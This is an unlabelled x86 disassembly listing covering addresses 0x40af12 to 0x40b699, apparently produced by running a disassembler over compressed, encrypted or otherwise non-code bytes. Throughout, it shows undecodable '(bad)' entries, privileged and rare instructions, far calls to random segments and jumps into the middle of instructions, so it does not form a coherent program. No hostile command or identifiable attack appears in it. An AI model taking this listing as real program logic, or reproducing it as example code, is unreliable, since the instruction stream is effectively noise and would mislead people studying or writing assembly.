  40af12:	inc    esp
  40af13:	loope  0x40aefb
  40af15:	pop    ecx
  40af16:	ins    BYTE PTR es:[edi],dx
  40af17:	test   BYTE PTR [esi-0x6cc2132],bh
  40af1d:	cwde   
  40af1e:	fcmovbe st,st(1)
  40af20:	shl    DWORD PTR [eax+0x57bafe65],cl
  40af26:	(bad)  
  40af28:	jno    0x40aeaa
  40af2a:	and    eax,DWORD PTR [esi]
  40af2c:	push   edx
  40af2d:	and    BYTE PTR [edx+ebp*4],dl
  40af30:	adc    DWORD PTR [ebx+0x6801a040],esp
  40af36:	mov    edx,0xe51a0723
  40af3b:	jns    0x40af94
  40af3d:	sub    esp,edx
  40af3f:	int3   
  40af40:	scas   eax,DWORD PTR es:[edi]
  40af41:	sbb    BYTE PTR [edi],0x94
  40af44:	inc    edx
  40af45:	icebp  
  40af46:	ss inc ecx
  40af48:	in     eax,0xfe
  40af4a:	jg     0x40afbc
  40af4c:	xchg   edi,eax
  40af4d:	xor    edi,ebp
  40af4f:	or     BYTE PTR ds:0xb70d794d,cl
  40af55:	fldcw  WORD PTR [esp+edi*1]
  40af58:	or     BYTE PTR [edi+0x64527a75],dh
  40af5e:	ror    DWORD PTR [edi+0x2b301b45],0x62
  40af65:	mov    ah,0xd6
  40af67:	pop    esi
  40af68:	sbb    eax,0xdadc45d6
  40af6d:	xchg   esi,eax
  40af6e:	addr16 push es
  40af70:	jns    0x40af07
  40af72:	mov    al,ds:0x56d364d1
  40af77:	into   
  40af78:	adc    dh,BYTE PTR [edi+0x45bcdfe1]
  40af7e:	fcmovnbe st,st(4)
  40af80:	std    
  40af81:	mov    esi,0xc5093d48
  40af86:	cdq    
  40af87:	xchg   edx,eax
  40af88:	mov    cl,0x41
  40af8a:	xchg   edx,eax
  40af8b:	and    DWORD PTR [eax+0x74],edi
  40af8e:	dec    eax
  40af8f:	not    DWORD PTR [edx]
  40af91:	mov    BYTE PTR [ebx-0x5922044f],dh
  40af97:	jnp    0x40af8f
  40af99:	add    dl,BYTE PTR [esi+eiz*4-0x64]
  40af9d:	fsub   DWORD PTR [esi]
  40af9f:	sbb    eax,0x152dee78
  40afa4:	mov    bl,BYTE PTR [esi+0x206a00b9]
  40afaa:	cli    
  40afab:	add    al,BYTE PTR fs:[esi-0x5c09de3e]
  40afb2:	call   FWORD PTR [esi-0x5b]
  40afb5:	dec    edi
  40afb6:	imul   esi,eax,0x75fa0e0
  40afbc:	lods   eax,DWORD PTR ds:[esi]
  40afbd:	bound  ebp,QWORD PTR [edx-0x25945963]
  40afc3:	inc    ebx
  40afc4:	xchg   ecx,eax
  40afc5:	add    al,0xfa
  40afc7:	lock dec esi
  40afc9:	xchg   ebx,eax
  40afca:	cmp    edi,ebp
  40afcc:	dec    edx
  40afcd:	and    ebp,DWORD PTR [esi-0x76cb095c]
  40afd3:	pushf  
  40afd4:	mov    cl,0xfe
  40afd6:	mov    bl,0x1b
  40afd8:	jecxz  0x40af8f
  40afda:	sub    BYTE PTR [edx-0x73246b99],dl
  40afe0:	cmp    ch,ah
  40afe2:	stc    
  40afe3:	sbb    eax,0xb8fde11a
  40afe8:	sub    DWORD PTR [edx],ecx
  40afea:	jb     0x40af9c
  40afec:	(bad)  
  40afed:	mov    al,0x7e
  40afef:	inc    esi
  40aff0:	sub    bl,BYTE PTR [ebx-0x45]
  40aff3:	jno    0x40b061
  40aff5:	jo     0x40b060
  40aff7:	loopne 0x40af84
  40aff9:	cmp    dh,dh
  40affb:	adc    eax,0x9f74bfde
  40b000:	lods   eax,DWORD PTR ds:[esi]
  40b001:	sub    BYTE PTR [ebx],bh
  40b003:	retf   
  40b004:	dec    eax
  40b005:	ja     0x40afaf
  40b007:	pop    edx
  40b008:	lods   al,BYTE PTR ds:[esi]
  40b009:	test   al,0x49
  40b00b:	mov    ecx,0x3eacff6c
  40b010:	mov    al,ds:0x7a31c1fb
  40b015:	mov    al,0x4d
  40b017:	stos   DWORD PTR es:[edi],eax
  40b018:	pop    edi
  40b019:	aam    0x90
  40b01b:	loop   0x40b015
  40b01d:	icebp  
  40b01e:	sub    edi,DWORD PTR [edi+0x30f06ef4]
  40b024:	or     ch,BYTE PTR ds:0xb538ea5d
  40b02a:	fdiv   DWORD PTR [edi]
  40b02c:	add    bl,BYTE PTR [ecx+0x2e2c2eeb]
  40b032:	int3   
  40b033:	mov    esp,0x12fcea36
  40b038:	cli    
  40b039:	dec    eax
  40b03a:	fwait
  40b03b:	call   0xfa1cb33e
  40b040:	enter  0xf43c,0x81
  40b044:	dec    ebx
  40b045:	enter  0x6ab4,0x4b
  40b049:	sub    eax,0x158d45e
  40b04e:	inc    edx
  40b04f:	inc    ebp
  40b050:	lock jle 0x40b070
  40b053:	popf   
  40b054:	shr    BYTE PTR ds:0x42ea7a39,0x57
  40b05b:	std    
  40b05c:	scas   al,BYTE PTR es:[edi]
  40b05d:	sub    cl,BYTE PTR [esi*1+0x6b27a15d]
  40b064:	(bad)  
  40b065:	xchg   ecx,eax
  40b066:	cmp    DWORD PTR [ecx+ebp*4+0xb],0xa964fb6b
  40b06e:	dec    ecx
  40b06f:	shr    BYTE PTR ds:0xa1090cda,0x9c
  40b076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b077:	add    ebx,DWORD PTR [ecx*2-0x17b15d32]
  40b07e:	pop    ebx
  40b07f:	sub    eax,0xdfc4eaf8
  40b084:	xor    ebx,DWORD PTR [esi-0x7]
  40b087:	or     al,0xa0
  40b089:	daa    
  40b08a:	xor    eax,0xc643cabf
  40b08f:	pop    ds
  40b090:	aas    
  40b091:	mov    ah,BYTE PTR [ecx+0x4f]
  40b094:	fwait
  40b095:	dec    edi
  40b096:	ds mov edi,eax
  40b099:	pushf  
  40b09a:	popa   
  40b09b:	adc    edi,ebx
  40b09d:	retf   0xd5e3
  40b0a0:	out    dx,eax
  40b0a1:	sbb    al,0xd
  40b0a3:	nop
  40b0a4:	aas    
  40b0a5:	arpl   WORD PTR [ecx-0x61],bx
  40b0a8:	push   esi
  40b0a9:	retf   
  40b0aa:	inc    edx
  40b0ab:	mov    DWORD PTR [ebx-0x7317c714],esp
  40b0b1:	jne    0x40b07d
  40b0b3:	mov    ds:0x515c0a22,al
  40b0b8:	sub    eax,0x7bdd07f
  40b0bd:	push   edx
  40b0be:	imul   DWORD PTR [esi-0x7c5ef565]
  40b0c4:	mov    cl,0x53
  40b0c6:	daa    
  40b0c7:	push   DWORD PTR cs:[ebx-0x32f39e91]
  40b0ce:	pcmpeqb mm3,QWORD PTR [ebp-0x7]
  40b0d2:	jle    0x40b0d4
  40b0d4:	add    eax,0xf4feb94b
  40b0d9:	(bad)  
  40b0da:	adc    al,0x17
  40b0dc:	cdq    
  40b0dd:	call   0x5166:0x41d404cb
  40b0e4:	xchg   edx,eax
  40b0e5:	adc    DWORD PTR [edx+0x3e19f27f],ecx
  40b0eb:	mov    edx,0x4047f12a
  40b0f0:	stc    
  40b0f1:	or     al,0x6e
  40b0f3:	ret    0x71f4
  40b0f6:	or     ebp,edi
  40b0f8:	icebp  
  40b0f9:	jae    0x40b094
  40b0fb:	dec    edx
  40b0fc:	mov    esp,0x2ca9398c
  40b101:	and    eax,DWORD PTR [edx-0x14]
  40b104:	(bad)  
  40b105:	jns    0x40b180
  40b107:	or     dl,dh
  40b109:	(bad)  
  40b10b:	mov    ah,0x3e
  40b10d:	int    0x8
  40b10f:	ret    
  40b110:	mov    cl,0x2b
  40b112:	loopne 0x40b09b
  40b114:	in     eax,0x2f
  40b116:	jp     0x40b0cf
  40b118:	ja     0x40b129
  40b11a:	sbb    eax,0xc0b37de5
  40b11f:	ins    BYTE PTR es:[edi],dx
  40b120:	repnz std 
  40b122:	or     al,0xee
  40b124:	out    0x6e,al
  40b126:	and    al,0x6f
  40b128:	mov    ds:0x50e553eb,eax
  40b12d:	(bad)  
  40b12e:	loope  0x40b137
  40b130:	sti    
  40b131:	mov    BYTE PTR ss:[edi+0x177a80cc],bl
  40b138:	sub    DWORD PTR [ebp+0x6898a6f],ebp
  40b13e:	adc    eax,0x5edf8e71
  40b143:	ja     0x40b120
  40b145:	jno    0x40b16d
  40b147:	mov    WORD PTR [edi],ss
  40b149:	xchg   esp,eax
  40b14a:	push   ds
  40b14b:	into   
  40b14c:	mov    ebx,0xbc9091b8
  40b151:	push   ecx
  40b152:	cli    
  40b153:	push   ss
  40b154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b155:	xchg   ebp,eax
  40b156:	es aam 0xaf
  40b159:	ret    
  40b15a:	js     0x40b16d
  40b15c:	lods   eax,DWORD PTR ds:[esi]
  40b15d:	(bad)  
  40b15e:	push   ss
  40b15f:	fsub   QWORD PTR [edx]
  40b161:	sbb    BYTE PTR [edi-0x62],0xd6
  40b165:	sti    
  40b166:	push   0xc6ace332
  40b16b:	or     edx,ebx
  40b16d:	adc    ch,BYTE PTR [esp+edi*4+0x49]
  40b171:	out    0x93,al
  40b173:	dec    esi
  40b174:	xchg   ebx,eax
  40b175:	or     dh,bh
  40b177:	ins    DWORD PTR es:[edi],dx
  40b178:	rcr    DWORD PTR [eax],0x3d
  40b17b:	dec    ecx
  40b17c:	call   0xb3520150
  40b181:	outs   dx,DWORD PTR ds:[esi]
  40b182:	lds    ebp,FWORD PTR [ebx-0x57]
  40b185:	push   esi
  40b186:	mov    eax,0x53448b7
  40b18b:	xor    BYTE PTR [edi],0xe5
  40b18e:	xchg   esi,eax
  40b18f:	pusha  
  40b190:	icebp  
  40b191:	ins    DWORD PTR es:[edi],dx
  40b192:	pop    eax
  40b193:	nop
  40b194:	test   esp,ebp
  40b196:	mov    ebp,0x26e9c34a
  40b19b:	dec    esp
  40b19c:	mov    esi,0x59439272
  40b1a1:	cdq    
  40b1a2:	mov    esi,0x5f3c19c1
  40b1a7:	cmc    
  40b1a8:	icebp  
  40b1a9:	in     eax,dx
  40b1aa:	xchg   esp,eax
  40b1ab:	adc    eax,0x5679e193
  40b1b0:	in     al,dx
  40b1b1:	(bad)  
  40b1b2:	adc    DWORD PTR [ebx-0x3d],eax
  40b1b5:	inc    esp
  40b1b6:	push   es
  40b1b7:	cmp    esi,0x26
  40b1ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1bb:	and    dl,BYTE PTR [edi+0x79]
  40b1be:	sti    
  40b1bf:	mov    esi,esp
  40b1c1:	or     DWORD PTR ds:0x8fe7070a,ebx
  40b1c7:	test   eax,0x42ce3228
  40b1cc:	fcomip st,st(4)
  40b1ce:	dec    esi
  40b1cf:	data16 jns 0x40b20a
  40b1d2:	or     BYTE PTR [eax],cl
  40b1d4:	and    DWORD PTR [eax],ebp
  40b1d6:	jle    0x40b18e
  40b1d8:	or     al,0xc4
  40b1da:	pop    edx
  40b1db:	sahf   
  40b1dc:	test   ebx,edi
  40b1de:	cld    
  40b1df:	imul   edx,ebx,0xffffffcb
  40b1e2:	retf   
  40b1e3:	add    eax,0xe0218402
  40b1e8:	push   0x52ef6a61
  40b1ed:	inc    eax
  40b1ee:	retf   
  40b1ef:	mov    eax,ds:0xbede1d1f
  40b1f4:	push   es
  40b1f5:	js     0x40b205
  40b1f7:	pop    ecx
  40b1f8:	leave  
  40b1f9:	and    eax,0xdd3f02c0
  40b1fe:	scas   al,BYTE PTR es:[edi]
  40b1ff:	cmp    eax,0xed6918f2
  40b204:	cmp    cl,cl
  40b206:	mov    bh,0x5e
  40b208:	inc    eax
  40b209:	popa   
  40b20a:	or     BYTE PTR [ecx-0x35ce54b1],dh
  40b210:	popf   
  40b211:	stos   DWORD PTR es:[edi],eax
  40b212:	push   edi
  40b213:	sbb    BYTE PTR [ebp-0x4edd3c4],al
  40b219:	pop    ebp
  40b21a:	lea    ecx,[esi+0x8]
  40b21d:	imul   edx,DWORD PTR [edx-0x63],0x51
  40b221:	fist   DWORD PTR [eax+0x22]
  40b224:	stc    
  40b225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b226:	ss dec ebx
  40b228:	ret    0x61b9
  40b22b:	and    BYTE PTR [esi],dh
  40b22d:	dec    esi
  40b22e:	repnz ins BYTE PTR es:[edi],dx
  40b230:	std    
  40b231:	stos   BYTE PTR es:[edi],al
  40b232:	jae    0x40b1e6
  40b234:	cmp    dl,al
  40b236:	cmc    
  40b237:	loope  0x40b24c
  40b239:	outs   dx,BYTE PTR ds:[esi]
  40b23a:	and    DWORD PTR [esi],ecx
  40b23c:	add    dl,BYTE PTR [ebp-0xd9056bd]
  40b242:	pop    esi
  40b243:	je     0x40b204
  40b245:	xor    BYTE PTR [esi],dh
  40b247:	inc    ecx
  40b248:	jmp    0x3d93:0x971629da
  40b24f:	xor    DWORD PTR [edx],ecx
  40b251:	sub    eax,0xd585fb4b
  40b256:	pop    ecx
  40b257:	in     al,dx
  40b258:	mov    ds:0xa2bc1d83,eax
  40b25d:	inc    esi
  40b25e:	lahf   
  40b25f:	fisub  WORD PTR [eax]
  40b261:	inc    DWORD PTR [ebp-0x6c65b937]
  40b267:	xchg   ebp,eax
  40b268:	add    eax,eax
  40b26a:	push   esi
  40b26b:	pop    ds
  40b26c:	pop    esi
  40b26d:	jb     0x40b2cb
  40b26f:	retf   0x5690
  40b272:	jecxz  0x40b254
  40b274:	lods   eax,DWORD PTR ds:[esi]
  40b275:	or     DWORD PTR [esi+0x4df57b89],esi
  40b27b:	ss and eax,0xf0f9488d
  40b281:	inc    ebp
  40b282:	cmp    ecx,edi
  40b284:	cmp    eax,0xa265d9f4
  40b289:	je     0x40b21f
  40b28b:	dec    ebx
  40b28c:	inc    ecx
  40b28d:	add    dl,BYTE PTR [ecx+eiz*2+0x71]
  40b291:	jmp    0xc86bd32b
  40b296:	and    BYTE PTR [eax],cl
  40b298:	xor    BYTE PTR [edx],ah
  40b29a:	pop    esp
  40b29b:	adc    bh,ch
  40b29d:	ds mov ecx,0x3bb6b76c
  40b2a3:	dec    edi
  40b2a4:	mov    ds:0x13b1c690,eax
  40b2a9:	inc    edx
  40b2aa:	add    esi,DWORD PTR [edx-0x5387f76]
  40b2b0:	popa   
  40b2b1:	out    dx,eax
  40b2b2:	sbb    ah,BYTE PTR [ebx+ebp*1]
  40b2b5:	hlt    
  40b2b6:	out    dx,eax
  40b2b7:	adc    eax,0xd0896ebd
  40b2bc:	dec    edi
  40b2bd:	popa   
  40b2be:	sub    al,0xa5
  40b2c0:	mov    cl,0x90
  40b2c2:	inc    esi
  40b2c3:	call   0x121f9f6a
  40b2c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2c9:	mul    bh
  40b2cb:	mov    cl,0xb5
  40b2cd:	push   edx
  40b2ce:	dec    edi
  40b2cf:	add    BYTE PTR [edx+0x36],dl
  40b2d2:	jmp    0x40b2ea
  40b2d4:	adc    eax,0x45427c4
  40b2d9:	pop    eax
  40b2da:	or     al,0xde
  40b2dc:	push   eax
  40b2dd:	pop    esi
  40b2de:	int3   
  40b2df:	rcr    eax,0x6b
  40b2e2:	call   FWORD PTR ds:0xb0d86a5
  40b2e8:	test   al,0x7c
  40b2ea:	scas   al,BYTE PTR es:[edi]
  40b2eb:	push   esi
  40b2ec:	jecxz  0x40b366
  40b2ee:	xchg   cl,dl
  40b2f0:	xor    eax,0x70a6918d
  40b2f5:	sbb    edi,DWORD PTR [edx]
  40b2f7:	les    ecx,FWORD PTR [edx+0x195ad8c4]
  40b2fd:	cdq    
  40b2fe:	shl    eax,cl
  40b300:	mov    ebp,0x9a43f808
  40b305:	and    DWORD PTR [ecx],0xc9a2fee5
  40b30b:	cmc    
  40b30c:	int3   
  40b30d:	mov    cs,WORD PTR [ecx+0x780fed4c]
  40b313:	sbb    BYTE PTR [edi-0x3b90e3b1],bl
  40b319:	pop    edx
  40b31a:	retf   
  40b31b:	nop
  40b31c:	cwde   
  40b31d:	leave  
  40b31e:	pop    es
  40b31f:	cs loope 0x40b37d
  40b322:	or     cl,BYTE PTR [ebx-0x4]
  40b325:	and    BYTE PTR [edx],cl
  40b327:	cmp    ebp,DWORD PTR [esi-0x10]
  40b32a:	test   DWORD PTR [esi+0x50],esi
  40b32d:	jno    0x40b30f
  40b32f:	lds    esi,FWORD PTR [esi+0x3582137e]
  40b335:	cmp    al,0x3a
  40b337:	shl    esp,cl
  40b339:	mov    ebx,0xd5a77476
  40b33e:	je     0x40b35d
  40b340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b341:	outs   dx,BYTE PTR ds:[esi]
  40b343:	cs inc edx
  40b345:	and    eax,0x7acfc618
  40b34a:	test   BYTE PTR [edi],0xb8
  40b34d:	outs   dx,DWORD PTR ds:[esi]
  40b34e:	xor    cl,BYTE PTR [edx+0x48]
  40b351:	nop
  40b352:	int3   
  40b353:	dec    edi
  40b354:	mov    cs,ebx
  40b356:	add    eax,0x9b37a299
  40b35b:	dec    ebx
  40b35c:	test   ah,ch
  40b35e:	cmp    eax,0x8d49fa36
  40b363:	cwde   
  40b364:	loop   0x40b36c
  40b366:	mov    ebx,0x77ab1c4e
  40b36b:	mov    bh,0xc0
  40b36d:	mov    al,0x2f
  40b36f:	mov    dl,0xe5
  40b371:	cld    
  40b372:	dec    esi
  40b373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b374:	and    esp,DWORD PTR [esp+edi*8]
  40b377:	hlt    
  40b378:	(bad)  
  40b379:	aas    
  40b37a:	or     BYTE PTR [ebp+ebx*4+0x5fbd1c3b],bl
  40b381:	push   ds
  40b382:	or     eax,0x568dad52
  40b387:	pop    ebp
  40b388:	or     DWORD PTR [edx+eax*4],esp
  40b38b:	jmp    0xb7d4:0x46060335
  40b392:	push   es
  40b393:	aam    0x8d
  40b395:	mov    ebx,0x1891f7d2
  40b39a:	repz ja 0x40b407
  40b39d:	stos   BYTE PTR es:[edi],al
  40b39e:	add    BYTE PTR [edx+edx*1],ah
  40b3a1:	adc    DWORD PTR [ecx],edi
  40b3a3:	sub    DWORD PTR [eax-0x8],eax
  40b3a6:	addr16 mov esi,0x17cf6ecf
  40b3ac:	mov    BYTE PTR [ecx+edx*4-0x77],ch
  40b3b0:	or     ebx,DWORD PTR [ebx+0x1f637c68]
  40b3b6:	mov    edx,esp
  40b3b8:	xchg   edi,eax
  40b3b9:	div    BYTE PTR [ebp-0x22]
  40b3bc:	fcmovnu st,st(0)
  40b3be:	mov    ebp,0x315be486
  40b3c3:	or     ebx,DWORD PTR [edi-0x529b997a]
  40b3c9:	stos   DWORD PTR es:[edi],eax
  40b3ca:	jnp    0x40b3d4
  40b3cc:	xor    BYTE PTR [ebp-0x2fb52051],dh
  40b3d2:	test   BYTE PTR [ebx-0x56],dl
  40b3d5:	pop    ebx
  40b3d6:	fwait
  40b3d7:	mov    esp,edi
  40b3d9:	push   cs
  40b3da:	pusha  
  40b3db:	pop    eax
  40b3dc:	dec    BYTE PTR [ebx-0x69]
  40b3df:	dec    edx
  40b3e0:	(bad)  
  40b3e1:	xor    BYTE PTR [eax],ah
  40b3e3:	mov    dl,0xe2
  40b3e5:	pop    ecx
  40b3e6:	xor    al,0x4b
  40b3e8:	cs xchg ebp,eax
  40b3ea:	jne    0x40b36c
  40b3ec:	push   edx
  40b3ed:	adc    ebx,DWORD PTR ds:0xcfb22d8c
  40b3f3:	bnd js 0x40b417
  40b3f6:	ret    0xd94a
  40b3f9:	mov    ecx,0x8aa8718c
  40b3fe:	pusha  
  40b3ff:	pushf  
  40b400:	punpckldq mm6,DWORD PTR gs:[esi-0x66b2cf96]
  40b408:	aad    0x4
  40b40a:	jo     0x40b45f
  40b40c:	inc    edx
  40b40d:	inc    ebx
  40b40e:	pop    esi
  40b40f:	cmp    eax,0x9a72f70c
  40b414:	xchg   ebp,eax
  40b415:	jmp    0xc19ddbd
  40b41a:	jg     0x40b47d
  40b41c:	into   
  40b41d:	cmc    
  40b41e:	jle    0x40b465
  40b420:	ficom  WORD PTR [ecx-0x7f099c0d]
  40b426:	sub    eax,0x547dedc7
  40b42b:	xchg   ebp,eax
  40b42c:	mov    al,ds:0x9a6efa5
  40b431:	dec    ebx
  40b432:	push   0xffffffb5
  40b434:	add    DWORD PTR [ecx+0x5da5af2],0x48
  40b43b:	jno    0x40b3e1
  40b43d:	aas    
  40b43e:	out    0xfb,eax
  40b440:	ins    BYTE PTR es:[edi],dx
  40b441:	push   edx
  40b442:	imul   ebp,DWORD PTR [ebp+0x65],0x3e
  40b446:	xchg   ch,bh
  40b448:	or     al,0xd7
  40b44a:	jl     0x40b4be
  40b44c:	bnd call 0xe4857b18
  40b452:	and    eax,0x3d9116eb
  40b457:	pop    esi
  40b458:	ds pushf 
  40b45a:	cmp    DWORD PTR [edi],ecx
  40b45c:	iret   
  40b45d:	dec    ebx
  40b45e:	jns    0x40b42b
  40b460:	mov    BYTE PTR [esi],cl
  40b462:	pop    ebp
  40b463:	jle    0x40b40d
  40b465:	inc    edi
  40b466:	inc    esi
  40b467:	or     esp,eax
  40b469:	inc    edi
  40b46a:	push   es
  40b46b:	and    eax,DWORD PTR [eax+0x6b]
  40b46e:	sbb    BYTE PTR [ebp+0x4d5005a5],dh
  40b474:	add    eax,esp
  40b476:	pop    esp
  40b477:	imul   esp,DWORD PTR [edx+0x28],0x5845e98a
  40b47e:	mov    ds:0xb2877eff,al
  40b483:	push   ebx
  40b484:	fstp   TBYTE PTR [eax-0x3ec3105c]
  40b48a:	push   0x62f6e054
  40b48f:	push   cs
  40b490:	add    ch,BYTE PTR [esi+0x4932c290]
  40b496:	cmp    al,0x15
  40b498:	ret    0x35c9
  40b49b:	sbb    eax,eax
  40b49d:	inc    ecx
  40b49f:	mov    ch,0x7e
  40b4a1:	cmp    dh,bl
  40b4a3:	pop    esp
  40b4a4:	cwde   
  40b4a5:	mov    eax,ds:0x9322c27e
  40b4aa:	rcl    DWORD PTR [eax],0xb6
  40b4ad:	cmc    
  40b4ae:	mov    bl,0xf7
  40b4b0:	xor    ebp,edi
  40b4b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4b3:	push   ebp
  40b4b4:	rol    al,1
  40b4b6:	retf   0x254f
  40b4b9:	mov    ah,0x8d
  40b4bb:	(bad)  
  40b4bc:	cld    
  40b4bd:	(bad)  
  40b4be:	mov    al,0x6
  40b4c0:	scas   eax,DWORD PTR es:[edi]
  40b4c1:	ss push ds
  40b4c3:	arpl   WORD PTR [edx-0x281754ff],ax
  40b4c9:	(bad)  [ebx]
  40b4cb:	je     0x40b462
  40b4cd:	rcl    DWORD PTR [ebp+0x1963a6ac],1
  40b4d3:	leave  
  40b4d4:	test   al,0xfb
  40b4d6:	pusha  
  40b4d7:	or     al,0x66
  40b4d9:	sub    BYTE PTR [eax-0x57dda93c],bl
  40b4df:	int    0xc9
  40b4e1:	inc    ecx
  40b4e2:	loop   0x40b534
  40b4e4:	mov    DWORD PTR [ebx],eax
  40b4e6:	and    DWORD PTR [ecx],edx
  40b4e8:	inc    edx
  40b4e9:	neg    WORD PTR ds:0x29a2adac
  40b4f0:	mov    eax,0x86457451
  40b4f5:	mov    edi,0xae8e3332
  40b4fa:	call   0x59505a0f
  40b4ff:	les    eax,FWORD PTR [esi+edi*8-0x59]
  40b503:	dec    DWORD PTR [ebp-0x6bb8a117]
  40b509:	fnstsw WORD PTR ds:0xe3dd266f
  40b50f:	sub    DWORD PTR [ecx+0x77c57b5f],ebp
  40b515:	les    eax,FWORD PTR [eax+0x6]
  40b518:	jmp    0x71a58840
  40b51d:	mov    esp,0x7f3c65f1
  40b522:	ds inc edi
  40b524:	ins    BYTE PTR es:[edi],dx
  40b525:	adc    BYTE PTR [ebx+eax*1+0x1d],cl
  40b529:	into   
  40b52a:	pop    eax
  40b52b:	gs clc 
  40b52d:	lahf   
  40b52e:	int    0x39
  40b530:	nop    ebp
  40b533:	ret    
  40b534:	add    al,0x96
  40b536:	or     DWORD PTR [edx+0x1d70f987],ebx
  40b53c:	pushf  
  40b53d:	mov    bh,0x60
  40b53f:	dec    ebx
  40b540:	sahf   
  40b541:	lock and dl,BYTE PTR [esi-0x5b4ddcb7]
  40b548:	dec    ebx
  40b549:	and    bl,al
  40b54b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b54c:	jbe    0x40b52f
  40b54e:	xchg   edi,eax
  40b54f:	pop    ebp
  40b550:	xor    ah,ch
  40b552:	ret    
  40b553:	aad    0xd7
  40b555:	and    bh,bl
  40b557:	push   esi
  40b558:	shr    ecx,1
  40b55a:	sbb    eax,DWORD PTR [edi+0x15fa6816]
  40b560:	cmc    
  40b561:	jg     0x40b5d4
  40b563:	xchg   ebx,eax
  40b564:	nop
  40b565:	pop    edi
  40b566:	aas    
  40b567:	(bad)  
  40b568:	cmp    al,0x9b
  40b56a:	push   esi
  40b56b:	ds cmp eax,0xe4f9686d
  40b571:	mov    ebp,0x897c14ac
  40b576:	std    
  40b577:	dec    ebp
  40b578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b579:	sti    
  40b57a:	cmp    BYTE PTR [ebx+0x1cad0330],ch
  40b580:	repz xor ah,BYTE PTR [esi]
  40b583:	cli    
  40b584:	fld    QWORD PTR [edi+0x336c4618]
  40b58a:	sahf   
  40b58b:	ficomp WORD PTR [ebx]
  40b58d:	dec    esp
  40b58e:	and    dl,al
  40b590:	and    eax,0x3d9d0c30
  40b595:	repnz iret 
  40b597:	shl    ecx,cl
  40b599:	push   0xd559ac2e
  40b59e:	jmp    0xb8b83479
  40b5a3:	fisubr WORD PTR [eax-0x3f]
  40b5a6:	and    BYTE PTR [edx+eiz*2],cl
  40b5a9:	push   esi
  40b5aa:	scas   eax,DWORD PTR es:[edi]
  40b5ab:	je     0x40b601
  40b5ad:	shl    DWORD PTR [esi+eax*2],0xb8
  40b5b1:	scas   al,BYTE PTR es:[edi]
  40b5b2:	stos   DWORD PTR es:[edi],eax
  40b5b3:	mov    ch,0x80
  40b5b5:	jecxz  0x40b575
  40b5b7:	jbe    0x40b620
  40b5b9:	das    
  40b5ba:	cwde   
  40b5bb:	dec    esi
  40b5bc:	push   ebp
  40b5bd:	(bad)  
  40b5be:	pop    edi
  40b5bf:	dec    esi
  40b5c0:	xchg   esi,eax
  40b5c1:	nop
  40b5c2:	pop    esi
  40b5c3:	repnz nop
  40b5c5:	jns    0x40b612
  40b5c7:	sub    eax,0xda4ca49f
  40b5cc:	mov    al,ds:0xfe0396c6
  40b5d1:	cmp    BYTE PTR [bp+si],0xed
  40b5d5:	pop    ds
  40b5d6:	(bad)  
  40b5d7:	das    
  40b5d8:	daa    
  40b5d9:	jge    0x40b5c1
  40b5db:	mov    bh,0xe1
  40b5dd:	dec    edi
  40b5de:	dec    DWORD PTR [ebx-0x70]
  40b5e1:	pop    eax
  40b5e2:	shr    BYTE PTR [ebx-0x2827c944],1
  40b5e8:	lock in al,dx
  40b5ea:	mov    eax,0xd1870373
  40b5ef:	push   cs
  40b5f0:	fsubrp st(0),st
  40b5f2:	adc    al,0x79
  40b5f4:	xor    DWORD PTR [edx+0x2ee80cf3],esi
  40b5fa:	pop    eax
  40b5fb:	enter  0xd41a,0x7a
  40b5ff:	xlat   BYTE PTR ds:[ebx]
  40b600:	out    dx,eax
  40b601:	(bad)  
  40b602:	and    al,0x7f
  40b604:	push   ebx
  40b605:	leave  
  40b606:	jp     0x40b5c6
  40b608:	inc    ebx
  40b609:	(bad)  
  40b60a:	sahf   
  40b60b:	daa    
  40b60c:	pop    ebp
  40b60d:	xchg   ebx,eax
  40b60e:	push   es
  40b60f:	shl    BYTE PTR [ecx],1
  40b611:	mov    esp,0x3f1ec160
  40b616:	adc    bl,ch
  40b618:	add    DWORD PTR [edx+0x64],edi
  40b61b:	mov    cl,0x48
  40b61d:	aas    
  40b61e:	sti    
  40b61f:	in     al,0xe5
  40b621:	test   eax,0xa1fe61ab
  40b626:	stos   BYTE PTR es:[edi],al
  40b627:	cwde   
  40b628:	xchg   edi,eax
  40b629:	inc    ebp
  40b62a:	jg     0x40b5ba
  40b62c:	lock js 0x40b6ab
  40b62f:	outs   dx,DWORD PTR ds:[esi]
  40b630:	lods   eax,DWORD PTR ds:[esi]
  40b631:	ja     0x40b629
  40b633:	sar    BYTE PTR [edx-0x7ee7fea3],cl
  40b639:	jp     0x40b635
  40b63b:	iret   
  40b63c:	ror    BYTE PTR [edx],1
  40b63e:	jmp    0x40b6b3
  40b640:	leave  
  40b641:	lock adc al,0x7
  40b644:	adc    esi,ebx
  40b646:	dec    esp
  40b647:	(bad)  
  40b648:	xchg   edx,eax
  40b649:	ret    0x15c6
  40b64c:	ins    DWORD PTR es:[edi],dx
  40b64d:	jmp    FWORD PTR [ebx+0x53e7de27]
  40b653:	clc    
  40b654:	add    bl,BYTE PTR [edi+0x106583c2]
  40b65a:	mov    cl,0x8a
  40b65c:	das    
  40b65d:	cmp    BYTE PTR [eax],dh
  40b65f:	or     eax,0xbbb5b9c0
  40b664:	fidiv  DWORD PTR [esi-0x35893ec5]
  40b66a:	fs mov ah,0x8a
  40b66d:	fucom  st(6)
  40b66f:	aas    
  40b670:	adc    esi,edi
  40b672:	(bad)  
  40b674:	or     eax,ebx
  40b676:	push   ebx
  40b677:	ds xor eax,0xdf5db567
  40b67d:	inc    ebx
  40b67e:	stos   DWORD PTR es:[edi],eax
  40b67f:	mov    BYTE PTR [eax-0x69],cl
  40b682:	mov    esi,0xc068db71
  40b687:	adc    ch,ch
  40b689:	in     eax,0xa5
  40b68b:	jbe    0x40b631
  40b68d:	jmp    0x40b6aa
  40b68f:	sub    al,0x8d
  40b691:	dec    esp
  40b692:	dec    ebp
  40b693:	icebp  
  40b694:	mov    ds:0x37558ba7,eax
  40b699:	test   al,0x1e
